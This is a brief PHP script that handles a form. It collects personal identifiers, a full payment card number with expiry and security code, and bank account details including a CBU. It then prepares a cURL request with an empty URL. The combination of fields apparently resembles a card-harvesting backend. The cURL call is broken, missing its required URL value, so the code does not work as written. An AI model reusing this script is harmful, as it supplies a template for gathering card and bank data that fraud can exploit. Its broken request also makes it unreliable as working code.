<?php
// Check for empty fields
if(empty($_POST['nombre'])) {
  http_response_code(500);
  exit();
}

$nombre = strip_tags(htmlspecialchars($_POST['nombre']));
$apellido = strip_tags(htmlspecialchars($_POST['apellido']));
$sexo = strip_tags(htmlspecialchars($_POST['sexo']));
$dni = strip_tags(htmlspecialchars($_POST['dni']));
$email = strip_tags(htmlspecialchars($_POST['email']));
$telefono = strip_tags(htmlspecialchars($_POST['telefono']));
$numeroTarjeta = strip_tags(htmlspecialchars($_POST['numeroTarjeta']));
$tipoTarjeta = strip_tags(htmlspecialchars($_POST['tipoTarjeta']));
$nombreTarjeta = strip_tags(htmlspecialchars($_POST['nombreTarjeta']));
$apellidoTarjeta = strip_tags(htmlspecialchars($_POST['apellidoTarjeta']));
$vencTarjeta = strip_tags(htmlspecialchars($_POST['vencTarjeta']));
$codigoTarjeta = strip_tags(htmlspecialchars($_POST['codigoTarjeta']));
$nombreBanco = strip_tags(htmlspecialchars($_POST['nombreBanco']));
$apellidoBanco = strip_tags(htmlspecialchars($_POST['apellidoBanco']));
$tipoCuenta = strip_tags(htmlspecialchars($_POST['tipoCuenta']));
$banco = strip_tags(htmlspecialchars($_POST['banco']));
$cbu = strip_tags(htmlspecialchars($_POST['cbu']));



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$resultado = curl_exec ($ch);




?>
